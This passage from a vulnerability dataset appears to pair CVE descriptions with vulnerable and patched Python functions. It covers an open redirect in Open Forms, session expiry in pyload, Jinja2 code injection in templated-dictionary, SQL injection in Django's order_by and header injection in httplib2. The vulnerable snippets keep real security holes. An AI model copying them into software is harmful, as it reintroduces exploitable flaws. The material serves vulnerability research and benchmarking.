    "cve_description": "Open Forms is an application for creating and publishing smart forms. Prior to versions 1.0.9 and 1.1.1, the cookie consent page in Open Forms contains an open redirect by injecting a `referer` querystring parameter and failing to validate the value. A malicious actor is able to redirect users to a website under their control, opening them up for phishing attacks. The redirect is initiated by the open forms backend which is a legimate page, making it less obvious to end users they are being redirected to a malicious website. Versions 1.0.9 and 1.1.1 contain patches for this issue. There are no known workarounds avaialble.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/open-formulieren/open-forms",
    "patch_url": [
      "https://github.com/open-formulieren/open-forms/commit/3e8c9cce386e548765783354694fbb9d7a6ea7d3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_265_1",
        "commit": "908a36a",
        "file_path": "src/openforms/utils/redirect.py",
        "start_line": 13,
        "end_line": 30,
        "snippet": "def allow_redirect_url(url: str) -> bool:\n    \"\"\"\n    Check that a redirect target is allowed against the CORS policy.\n\n    The \"Cross-Origin Resource Sharing\" configuration specifies which external hosts\n    are allowed to access Open Forms. We leverage this configuration to block or allow\n    redirects to external hosts.\n    \"\"\"\n    cors = CorsMiddleware()\n    origin = origin_from_url(url)\n    parts = urlparse(url)\n\n    if not cors_conf.CORS_ALLOW_ALL_ORIGINS and not cors.origin_found_in_white_lists(\n        origin, parts\n    ):\n        return False\n    else:\n        return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_265_1",
        "commit": "3e8c9cc",
        "file_path": "src/openforms/utils/redirect.py",
        "start_line": 16,
        "end_line": 47,
        "snippet": "def allow_redirect_url(url: str) -> bool:\n    \"\"\"\n    Check that a redirect target is allowed against the CORS policy.\n\n    The \"Cross-Origin Resource Sharing\" configuration specifies which external hosts\n    are allowed to access Open Forms. We leverage this configuration to block or allow\n    redirects to external hosts.\n    \"\"\"\n    # first, check if the URL is in ALLOWED_HOSTS. We deliberately exclude the wildcard\n    # setting to require explicit configuration either via ALLOWED_HOSTS or CORS_* settings.\n    allowed_hosts_check = url_has_allowed_host_and_scheme(\n        url=url,\n        allowed_hosts=[host for host in settings.ALLOWED_HOSTS if host != \"*\"],\n        # settings.ALLOWED_HOSTS means we are serving the domain, so we can enforce our\n        # own custom HTTPS setting.\n        require_https=settings.IS_HTTPS,\n    )\n    # if we pass via ALLOWED_HOSTS, short-circuit, otherwise we check the CORS policy\n    # for allowed external domains.\n    if allowed_hosts_check:\n        return True\n\n    cors = CorsMiddleware()\n    origin = origin_from_url(url)\n    parts = urlparse(url)\n\n    if not cors_conf.CORS_ALLOW_ALL_ORIGINS and not cors.origin_found_in_white_lists(\n        origin, parts\n    ):\n        return False\n    else:\n        return True"
      },
      {
        "id": "fix_py_265_2",
        "commit": "3e8c9cc",
        "file_path": "src/openforms/forms/templatetags/openforms.py",
        "start_line": 37,
        "end_line": 50,
        "snippet": "def get_allowed_redirect_url(*candidates: str) -> str:\n    \"\"\"\n    Output the first variable passed that is not empty and is an allowed redirect URL.\n\n    Output nothing if none of the values satisfy the requirements.\n\n    Heavily insired on the builtin {% firstof %} tag.\n    \"\"\"\n    for candidate in candidates:\n        if not candidate:\n            continue\n        if allow_redirect_url(candidate):\n            return candidate\n    return \"\""
      }
    ],
    "vul_patch": "--- a/src/openforms/utils/redirect.py\n+++ b/src/openforms/utils/redirect.py\n@@ -6,6 +6,20 @@\n     are allowed to access Open Forms. We leverage this configuration to block or allow\n     redirects to external hosts.\n     \"\"\"\n+    # first, check if the URL is in ALLOWED_HOSTS. We deliberately exclude the wildcard\n+    # setting to require explicit configuration either via ALLOWED_HOSTS or CORS_* settings.\n+    allowed_hosts_check = url_has_allowed_host_and_scheme(\n+        url=url,\n+        allowed_hosts=[host for host in settings.ALLOWED_HOSTS if host != \"*\"],\n+        # settings.ALLOWED_HOSTS means we are serving the domain, so we can enforce our\n+        # own custom HTTPS setting.\n+        require_https=settings.IS_HTTPS,\n+    )\n+    # if we pass via ALLOWED_HOSTS, short-circuit, otherwise we check the CORS policy\n+    # for allowed external domains.\n+    if allowed_hosts_check:\n+        return True\n+\n     cors = CorsMiddleware()\n     origin = origin_from_url(url)\n     parts = urlparse(url)\n\n--- /dev/null\n+++ b/src/openforms/utils/redirect.py\n@@ -0,0 +1,14 @@\n+def get_allowed_redirect_url(*candidates: str) -> str:\n+    \"\"\"\n+    Output the first variable passed that is not empty and is an allowed redirect URL.\n+\n+    Output nothing if none of the values satisfy the requirements.\n+\n+    Heavily insired on the builtin {% firstof %} tag.\n+    \"\"\"\n+    for candidate in candidates:\n+        if not candidate:\n+            continue\n+        if allow_redirect_url(candidate):\n+            return candidate\n+    return \"\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-0227",
    "cve_description": "Insufficient Session Expiration in GitHub repository pyload/pyload prior to 0.5.0b3.dev36.",
    "cwe_info": {
      "CWE-613": {
        "name": "Insufficient Session Expiration",
        "description": "According to WASC, \"Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\""
      }
    },
    "repo": "https://github.com/pyload/pyload",
    "patch_url": [
      "https://github.com/pyload/pyload/commit/c035714c0596b704b11af0f8a669352f128ad2d9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_335_1",
        "commit": "a7e1616",
        "file_path": "src/pyload/webui/app/helpers.py",
        "start_line": 166,
        "end_line": 169,
        "snippet": "def is_authenticated(session=flask.session):\n    return session.get(\"name\") and session.get(\n        \"authenticated\"\n    )  # NOTE: why checks name?"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_335_1",
        "commit": "c035714c0596b704b11af0f8a669352f128ad2d9",
        "file_path": "src/pyload/webui/app/helpers.py",
        "start_line": 166,
        "end_line": 171,
        "snippet": "def is_authenticated(session=flask.session):\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    user = session.get(\"name\")\n    authenticated = session.get(\"authenticated\")\n\n    return authenticated and api.user_exists(user)"
      },
      {
        "id": "fix_py_335_2",
        "commit": "c035714c0596b704b11af0f8a669352f128ad2d9",
        "file_path": "src/pyload/core/api/__init__.py",
        "start_line": 1233,
        "end_line": 1241,
        "snippet": "    def user_exists(self, username):\n        \"\"\"\n        Check if a user actually exists in the database.\n\n        :param username:\n        :return: boolean\n        \"\"\"\n        return self.pyload.db.user_exists(username)\n"
      },
      {
        "id": "fix_py_335_3",
        "commit": "c035714c0596b704b11af0f8a669352f128ad2d9",
        "file_path": "src/pyload/core/database/user_database.py",
        "start_line": 95,
        "end_line": 99,
        "snippet": "    @style.queue\n    def user_exists(self, user):\n        self.c.execute(\"SELECT name FROM users WHERE name=?\", (user,))\n        return self.c.fetchone() is not None\n"
      }
    ],
    "vul_patch": "--- a/src/pyload/webui/app/helpers.py\n+++ b/src/pyload/webui/app/helpers.py\n@@ -1,4 +1,6 @@\n def is_authenticated(session=flask.session):\n-    return session.get(\"name\") and session.get(\n-        \"authenticated\"\n-    )  # NOTE: why checks name?\n+    api = flask.current_app.config[\"PYLOAD_API\"]\n+    user = session.get(\"name\")\n+    authenticated = session.get(\"authenticated\")\n+\n+    return authenticated and api.user_exists(user)\n\n--- /dev/null\n+++ b/src/pyload/webui/app/helpers.py\n@@ -0,0 +1,8 @@\n+    def user_exists(self, username):\n+        \"\"\"\n+        Check if a user actually exists in the database.\n+\n+        :param username:\n+        :return: boolean\n+        \"\"\"\n+        return self.pyload.db.user_exists(username)\n\n--- /dev/null\n+++ b/src/pyload/webui/app/helpers.py\n@@ -0,0 +1,4 @@\n+    @style.queue\n+    def user_exists(self, user):\n+        self.c.execute(\"SELECT name FROM users WHERE name=?\", (user,))\n+        return self.c.fetchone() is not None\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-6395",
    "cve_description": "The Mock software contains a vulnerability wherein an attacker could potentially exploit privilege escalation, enabling the execution of arbitrary code with root user privileges. This weakness stems from the absence of proper sandboxing during the expansion and execution of Jinja2 templates, which may be included in certain configuration parameters. While the Mock documentation advises treating users added to the mock group as privileged, certain build systems invoking mock on behalf of users might inadvertently permit less privileged users to define configuration tags. These tags could then be passed as parameters to mock during execution, potentially leading to the utilization of Jinja2 templates for remote privilege escalation and the execution of arbitrary code as the root user on the build server.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/xsuchy/templated-dictionary",
    "patch_url": [
      "https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69",
      "https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_386_1",
        "commit": "11ecb712ac9c240ebda6c5c784023f3f22f5bd02",
        "file_path": "templated_dictionary/__init__.py",
        "start_line": 11,
        "end_line": 26,
        "snippet": "    def __init__(self, *args, alias_spec=None, **kwargs):\n        '''\n        Use the object dict.\n\n        Optional parameter 'alias_spec' is dictionary of form:\n        {'aliased_to': ['alias_one', 'alias_two', ...], ...}\n        When specified, and one of the aliases is accessed - the\n        'aliased_to' config option is returned.\n        '''\n        self.__dict__.update(*args, **kwargs)\n\n        self._aliases = {}\n        if alias_spec:\n            for aliased_to, aliases in alias_spec.items():\n                for alias in aliases:\n                    self._aliases[alias] = aliased_to"
      },
      {
        "id": "vul_py_386_2",
        "commit": "11ecb712ac9c240ebda6c5c784023f3f22f5bd02",
        "file_path": "templated_dictionary/__init__.py",
        "start_line": 79,
        "end_line": 88,
        "snippet": "    def __render_string(self, value):\n        orig = last = value\n        max_recursion = self.__dict__.get('jinja_max_recursion', 5)\n        for _ in range(max_recursion):\n            template = jinja2.Template(value, keep_trailing_newline=True)\n            value = _to_native(template.render(self.__dict__))\n            if value == last:\n                return value\n            last = value\n        raise ValueError(\"too deep jinja re-evaluation on '{}'\".format(orig))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_386_1",
        "commit": "bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69",
        "file_path": "templated_dictionary/__init__.py",
        "start_line": 11,
        "end_line": 28,
        "snippet": "    def __init__(self, *args, alias_spec=None, **kwargs):\n        '''\n        Use the object dict.\n\n        Optional parameter 'alias_spec' is dictionary of form:\n        {'aliased_to': ['alias_one', 'alias_two', ...], ...}\n        When specified, and one of the aliases is accessed - the\n        'aliased_to' config option is returned.\n        '''\n        self.__dict__.update(*args, **kwargs)\n\n        self.sandbox = sandbox.SandboxedEnvironment(keep_trailing_newline=True)\n\n        self._aliases = {}\n        if alias_spec:\n            for aliased_to, aliases in alias_spec.items():\n                for alias in aliases:\n                    self._aliases[alias] = aliased_to"
      },
      {
        "id": "fix_py_386_2",
        "commit": "bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69",
        "file_path": "templated_dictionary/__init__.py",
        "start_line": 81,
        "end_line": 89,
        "snippet": "    def __render_string(self, value):\n        orig = last = value\n        max_recursion = self.__dict__.get('jinja_max_recursion', 5)\n        for _ in range(max_recursion):\n            value = _to_native(self.sandbox.from_string(value).render(self.__dict__, func=lambda:None))\n            if value == last:\n                return value\n            last = value\n        raise ValueError(\"too deep jinja re-evaluation on '{}'\".format(orig))"
      }
    ],
    "vul_patch": "--- a/templated_dictionary/__init__.py\n+++ b/templated_dictionary/__init__.py\n@@ -9,6 +9,8 @@\n         '''\n         self.__dict__.update(*args, **kwargs)\n \n+        self.sandbox = sandbox.SandboxedEnvironment(keep_trailing_newline=True)\n+\n         self._aliases = {}\n         if alias_spec:\n             for aliased_to, aliases in alias_spec.items():\n\n--- a/templated_dictionary/__init__.py\n+++ b/templated_dictionary/__init__.py\n@@ -2,8 +2,7 @@\n         orig = last = value\n         max_recursion = self.__dict__.get('jinja_max_recursion', 5)\n         for _ in range(max_recursion):\n-            template = jinja2.Template(value, keep_trailing_newline=True)\n-            value = _to_native(template.render(self.__dict__))\n+            value = _to_native(self.sandbox.from_string(value).render(self.__dict__, func=lambda:None))\n             if value == last:\n                 return value\n             last = value\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-35042",
    "cve_description": "Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 allows QuerySet.order_by SQL injection if order_by is untrusted input from a client of a web application.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/0bd57a879a0d54920bb9038a732645fb917040e9",
      "https://github.com/django/django/commit/dae83a24519d6f284c74414e0b81d64d9b5a0db4",
      "https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_5_1",
        "commit": "8dc1cc0",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 1888,
        "end_line": 1932,
        "snippet": "    def add_ordering(self, *ordering):\n        \"\"\"\n        Add items from the 'ordering' sequence to the query's \"order by\"\n        clause. These items are either field names (not column names) --\n        possibly with a direction prefix ('-' or '?') -- or OrderBy\n        expressions.\n\n        If 'ordering' is empty, clear all ordering from the query.\n        \"\"\"\n        errors = []\n        for item in ordering:\n            if isinstance(item, str):\n                if '.' in item:\n                    warnings.warn(\n                        'Passing column raw column aliases to order_by() is '\n                        'deprecated. Wrap %r in a RawSQL expression before '\n                        'passing it to order_by().' % item,\n                        category=RemovedInDjango40Warning,\n                        stacklevel=3,\n                    )\n                    continue\n                if item == '?':\n                    continue\n                if item.startswith('-'):\n                    item = item[1:]\n                if item in self.annotations:\n                    continue\n                if self.extra and item in self.extra:\n                    continue\n                # names_to_path() validates the lookup. A descriptive\n                # FieldError will be raise if it's not.\n                self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)\n            elif not hasattr(item, 'resolve_expression'):\n                errors.append(item)\n            if getattr(item, 'contains_aggregate', False):\n                raise FieldError(\n                    'Using an aggregate in order_by() without also including '\n                    'it in annotate() is not allowed: %s' % item\n                )\n        if errors:\n            raise FieldError('Invalid order_by arguments: %s' % errors)\n        if ordering:\n            self.order_by += ordering\n        else:\n            self.default_ordering = False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_5_1",
        "commit": "0bd57a879a0d54920bb9038a732645fb917040e9",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 1890,
        "end_line": 1934,
        "snippet": "    def add_ordering(self, *ordering):\n        \"\"\"\n        Add items from the 'ordering' sequence to the query's \"order by\"\n        clause. These items are either field names (not column names) --\n        possibly with a direction prefix ('-' or '?') -- or OrderBy\n        expressions.\n\n        If 'ordering' is empty, clear all ordering from the query.\n        \"\"\"\n        errors = []\n        for item in ordering:\n            if isinstance(item, str):\n                if '.' in item and ORDER_PATTERN.match(item):\n                    warnings.warn(\n                        'Passing column raw column aliases to order_by() is '\n                        'deprecated. Wrap %r in a RawSQL expression before '\n                        'passing it to order_by().' % item,\n                        category=RemovedInDjango40Warning,\n                        stacklevel=3,\n                    )\n                    continue\n                if item == '?':\n                    continue\n                if item.startswith('-'):\n                    item = item[1:]\n                if item in self.annotations:\n                    continue\n                if self.extra and item in self.extra:\n                    continue\n                # names_to_path() validates the lookup. A descriptive\n                # FieldError will be raise if it's not.\n                self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)\n            elif not hasattr(item, 'resolve_expression'):\n                errors.append(item)\n            if getattr(item, 'contains_aggregate', False):\n                raise FieldError(\n                    'Using an aggregate in order_by() without also including '\n                    'it in annotate() is not allowed: %s' % item\n                )\n        if errors:\n            raise FieldError('Invalid order_by arguments: %s' % errors)\n        if ordering:\n            self.order_by += ordering\n        else:\n            self.default_ordering = False"
      },
      {
        "id": "fix_py_5_2",
        "commit": "0bd57a879a0d54920bb9038a732645fb917040e9",
        "file_path": "django/db/models/sql/constants.py",
        "start_line": 22,
        "end_line": 22,
        "snippet": "ORDER_PATTERN = _lazy_re_compile(r'[-+]?[.\\w]+$')"
      }
    ],
    "vul_patch": "--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -10,7 +10,7 @@\n         errors = []\n         for item in ordering:\n             if isinstance(item, str):\n-                if '.' in item:\n+                if '.' in item and ORDER_PATTERN.match(item):\n                     warnings.warn(\n                         'Passing column raw column aliases to order_by() is '\n                         'deprecated. Wrap %r in a RawSQL expression before '\n\n--- /dev/null\n+++ b/django/db/models/sql/query.py\n@@ -0,0 +1 @@\n+ORDER_PATTERN = _lazy_re_compile(r'[-+]?[.\\w]+$')\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-35042:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-35042/bin/python ./runtests.py queries.tests.QuerySetExceptionTests.test_order_by_escape_prevention\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-35042:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-35042/bin/python ./runtests.py queries.tests\n"
  },
  {
    "cve_id": "CVE-2020-11078",
    "cve_description": "In httplib2 before version 0.18.0, an attacker controlling unescaped part of uri for `httplib2.Http.request()` could change request headers and body, send additional hidden requests to same server. This vulnerability impacts software that uses httplib2 with uri constructed by string concatenation, as opposed to proper urllib building with escaping. This has been fixed in 0.18.0.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/httplib2/httplib2",
    "patch_url": [
      "https://github.com/httplib2/httplib2/commit/a1457cc31f3206cf691d11d2bf34e98865873e9e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_157_1",
        "commit": "9413ffc",
        "file_path": "python2/httplib2/__init__.py",
        "start_line": 1946,
        "end_line": 2227,
        "snippet": "    def request(\n        self,\n        uri,\n        method=\"GET\",\n        body=None,\n        headers=None,\n        redirections=DEFAULT_MAX_REDIRECTS,\n        connection_type=None,\n    ):\n        \"\"\" Performs a single HTTP request.\n\n        The 'uri' is the URI of the HTTP resource and can begin with either\n        'http' or 'https'. The value of 'uri' must be an absolute URI.\n\n        The 'method' is the HTTP method to perform, such as GET, POST, DELETE,\n        etc. There is no restriction on the methods allowed.\n\n        The 'body' is the entity body to be sent with the request. It is a\n        string object.\n\n        Any extra headers that are to be sent with the request should be\n        provided in the 'headers' dictionary.\n\n        The maximum number of redirect to follow before raising an\n        exception is 'redirections. The default is 5.\n\n        The return value is a tuple of (response, content), the first\n        being and instance of the 'Response' class, the second being\n        a string that contains the response entity body.\n        \"\"\"\n        conn_key = ''\n\n        try:\n            if headers is None:\n                headers = {}\n            else:\n                headers = self._normalize_headers(headers)\n\n            if \"user-agent\" not in headers:\n                headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n\n            uri = iri2uri(uri)\n\n            (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n\n            proxy_info = self._get_proxy_info(scheme, authority)\n\n            conn_key = scheme + \":\" + authority\n            conn = self.connections.get(conn_key)\n            if conn is None:\n                if not connection_type:\n                    connection_type = SCHEME_TO_CONNECTION[scheme]\n                certs = list(self.certificates.iter(authority))\n                if scheme == \"https\":\n                    if certs:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            key_file=certs[0][0],\n                            cert_file=certs[0][1],\n                            timeout=self.timeout,\n                            proxy_info=proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            ssl_version=self.ssl_version,\n                            key_password=certs[0][2],\n                        )\n                    else:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            timeout=self.timeout,\n                            proxy_info=proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            ssl_version=self.ssl_version,\n                        )\n                else:\n                    conn = self.connections[conn_key] = connection_type(\n                        authority, timeout=self.timeout, proxy_info=proxy_info\n                    )\n                conn.set_debuglevel(debuglevel)\n\n            if \"range\" not in headers and \"accept-encoding\" not in headers:\n                headers[\"accept-encoding\"] = \"gzip, deflate\"\n\n            info = email.Message.Message()\n            cachekey = None\n            cached_value = None\n            if self.cache:\n                cachekey = defrag_uri.encode(\"utf-8\")\n                cached_value = self.cache.get(cachekey)\n                if cached_value:\n                    # info = email.message_from_string(cached_value)\n                    #\n                    # Need to replace the line above with the kludge below\n                    # to fix the non-existent bug not fixed in this\n                    # bug report: http://mail.python.org/pipermail/python-bugs-list/2005-September/030289.html\n                    try:\n                        info, content = cached_value.split(\"\\r\\n\\r\\n\", 1)\n                        feedparser = email.FeedParser.FeedParser()\n                        feedparser.feed(info)\n                        info = feedparser.close()\n                        feedparser._parse = None\n                    except (IndexError, ValueError):\n                        self.cache.delete(cachekey)\n                        cachekey = None\n                        cached_value = None\n\n            if (\n                method in self.optimistic_concurrency_methods\n                and self.cache\n                and \"etag\" in info\n                and not self.ignore_etag\n                and \"if-match\" not in headers\n            ):\n                # http://www.w3.org/1999/04/Editing/\n                headers[\"if-match\"] = info[\"etag\"]\n\n            # https://tools.ietf.org/html/rfc7234\n            # A cache MUST invalidate the effective Request URI as well as [...] Location and Content-Location\n            # when a non-error status code is received in response to an unsafe request method.\n            if self.cache and cachekey and method not in self.safe_methods:\n                self.cache.delete(cachekey)\n\n            # Check the vary header in the cache to see if this request\n            # matches what varies in the cache.\n            if method in self.safe_methods and \"vary\" in info:\n                vary = info[\"vary\"]\n                vary_headers = vary.lower().replace(\" \", \"\").split(\",\")\n                for header in vary_headers:\n                    key = \"-varied-%s\" % header\n                    value = info[key]\n                    if headers.get(header, None) != value:\n                        cached_value = None\n                        break\n\n            if (\n                self.cache\n                and cached_value\n                and (method in self.safe_methods or info[\"status\"] == \"308\")\n                and \"range\" not in headers\n            ):\n                redirect_method = method\n                if info[\"status\"] not in (\"307\", \"308\"):\n                    redirect_method = \"GET\"\n                if \"-x-permanent-redirect-url\" in info:\n                    # Should cached permanent redirects be counted in our redirection count? For now, yes.\n                    if redirections <= 0:\n                        raise RedirectLimit(\n                            \"Redirected more times than rediection_limit allows.\",\n                            {},\n                            \"\",\n                        )\n                    (response, new_content) = self.request(\n                        info[\"-x-permanent-redirect-url\"],\n                        method=redirect_method,\n                        headers=headers,\n                        redirections=redirections - 1,\n                    )\n                    response.previous = Response(info)\n                    response.previous.fromcache = True\n                else:\n                    # Determine our course of action:\n                    #   Is the cached entry fresh or stale?\n                    #   Has the client requested a non-cached response?\n                    #\n                    # There seems to be three possible answers:\n                    # 1. [FRESH] Return the cache entry w/o doing a GET\n                    # 2. [STALE] Do the GET (but add in cache validators if available)\n                    # 3. [TRANSPARENT] Do a GET w/o any cache validators (Cache-Control: no-cache) on the request\n                    entry_disposition = _entry_disposition(info, headers)\n\n                    if entry_disposition == \"FRESH\":\n                        if not cached_value:\n                            info[\"status\"] = \"504\"\n                            content = \"\"\n                        response = Response(info)\n                        if cached_value:\n                            response.fromcache = True\n                        return (response, content)\n\n                    if entry_disposition == \"STALE\":\n                        if (\n                            \"etag\" in info\n                            and not self.ignore_etag\n                            and not \"if-none-match\" in headers\n                        ):\n                            headers[\"if-none-match\"] = info[\"etag\"]\n                        if \"last-modified\" in info and not \"last-modified\" in headers:\n                            headers[\"if-modified-since\"] = info[\"last-modified\"]\n                    elif entry_disposition == \"TRANSPARENT\":\n                        pass\n\n                    (response, new_content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n\n                if response.status == 304 and method == \"GET\":\n                    # Rewrite the cache entry with the new end-to-end headers\n                    # Take all headers that are in response\n                    # and overwrite their values in info.\n                    # unless they are hop-by-hop, or are listed in the connection header.\n\n                    for key in _get_end2end_headers(response):\n                        info[key] = response[key]\n                    merged_response = Response(info)\n                    if hasattr(response, \"_stale_digest\"):\n                        merged_response._stale_digest = response._stale_digest\n                    _updateCache(\n                        headers, merged_response, content, self.cache, cachekey\n                    )\n                    response = merged_response\n                    response.status = 200\n                    response.fromcache = True\n\n                elif response.status == 200:\n                    content = new_content\n                else:\n                    self.cache.delete(cachekey)\n                    content = new_content\n            else:\n                cc = _parse_cache_control(headers)\n                if \"only-if-cached\" in cc:\n                    info[\"status\"] = \"504\"\n                    response = Response(info)\n                    content = \"\"\n                else:\n                    (response, content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n        except Exception as e:\n            is_timeout = isinstance(e, socket.timeout)\n            if is_timeout:\n                conn = self.connections.pop(conn_key, None)\n                if conn:\n                    conn.close()\n\n            if self.force_exception_to_status_code:\n                if isinstance(e, HttpLib2ErrorWithResponse):\n                    response = e.response\n                    content = e.content\n                    response.status = 500\n                    response.reason = str(e)\n                elif is_timeout:\n                    content = \"Request Timeout\"\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"408\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Request Timeout\"\n                else:\n                    content = str(e)\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"400\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Bad Request\"\n            else:\n                raise\n\n        return (response, content)"
      },
      {
        "id": "vul_py_157_2",
        "commit": "9413ffc",
        "file_path": "python3/httplib2/__init__.py",
        "start_line": 1752,
        "end_line": 2029,
        "snippet": "    def request(\n        self,\n        uri,\n        method=\"GET\",\n        body=None,\n        headers=None,\n        redirections=DEFAULT_MAX_REDIRECTS,\n        connection_type=None,\n    ):\n        \"\"\" Performs a single HTTP request.\nThe 'uri' is the URI of the HTTP resource and can begin\nwith either 'http' or 'https'. The value of 'uri' must be an absolute URI.\n\nThe 'method' is the HTTP method to perform, such as GET, POST, DELETE, etc.\nThere is no restriction on the methods allowed.\n\nThe 'body' is the entity body to be sent with the request. It is a string\nobject.\n\nAny extra headers that are to be sent with the request should be provided in the\n'headers' dictionary.\n\nThe maximum number of redirect to follow before raising an\nexception is 'redirections. The default is 5.\n\nThe return value is a tuple of (response, content), the first\nbeing and instance of the 'Response' class, the second being\na string that contains the response entity body.\n        \"\"\"\n        conn_key = ''\n\n        try:\n            if headers is None:\n                headers = {}\n            else:\n                headers = self._normalize_headers(headers)\n\n            if \"user-agent\" not in headers:\n                headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n\n            uri = iri2uri(uri)\n\n            (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n\n            conn_key = scheme + \":\" + authority\n            conn = self.connections.get(conn_key)\n            if conn is None:\n                if not connection_type:\n                    connection_type = SCHEME_TO_CONNECTION[scheme]\n                certs = list(self.certificates.iter(authority))\n                if issubclass(connection_type, HTTPSConnectionWithTimeout):\n                    if certs:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            key_file=certs[0][0],\n                            cert_file=certs[0][1],\n                            timeout=self.timeout,\n                            proxy_info=self.proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            tls_maximum_version=self.tls_maximum_version,\n                            tls_minimum_version=self.tls_minimum_version,\n                            key_password=certs[0][2],\n                        )\n                    else:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            timeout=self.timeout,\n                            proxy_info=self.proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            tls_maximum_version=self.tls_maximum_version,\n                            tls_minimum_version=self.tls_minimum_version,\n                        )\n                else:\n                    conn = self.connections[conn_key] = connection_type(\n                        authority, timeout=self.timeout, proxy_info=self.proxy_info\n                    )\n                conn.set_debuglevel(debuglevel)\n\n            if \"range\" not in headers and \"accept-encoding\" not in headers:\n                headers[\"accept-encoding\"] = \"gzip, deflate\"\n\n            info = email.message.Message()\n            cachekey = None\n            cached_value = None\n            if self.cache:\n                cachekey = defrag_uri\n                cached_value = self.cache.get(cachekey)\n                if cached_value:\n                    try:\n                        info, content = cached_value.split(b\"\\r\\n\\r\\n\", 1)\n                     